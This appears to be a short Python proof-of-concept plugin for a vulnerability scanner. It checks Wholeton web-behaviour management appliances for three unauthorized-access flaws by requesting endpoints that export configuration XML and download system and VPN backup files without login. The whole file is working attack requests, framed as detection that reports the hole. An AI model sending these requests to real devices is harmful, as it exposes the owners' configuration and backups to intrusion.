#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  惠尔顿上网行为管理系统3处未授权访问
Author    :  a
mail      :  a@lcx.cc

"""
import re
def assign(service, arg):
    if service == 'wholeton':
        return True, arg
def audit(arg):
    payloads = ['base/web/ExportXml.php?type=1',
                'base/vpn/download_bak.php']
    header='Range:  bytes=0-100'
    for payload in payloads:
        target = arg + payload
        code, head, res, errcode, _ = curl.curl2(target,header=header);
        if code==200 and ('<Subject Remark' in res and 'Log' in res) or ('filename= config.bak' in head and 'Wholeton' in res):
            security_hole(target)
            return arg

    payload='base/sys/backfile.php'
    data='m=backup'
    target = arg + payload

    code, head, res, errcode, _ = curl.curl2(target,data);
    if code==200 and 'Content-disposition: filename=sys_date.bak' in head:
        security_hole(target)

        return arg
if __name__== '__main__':
    from dummy import *
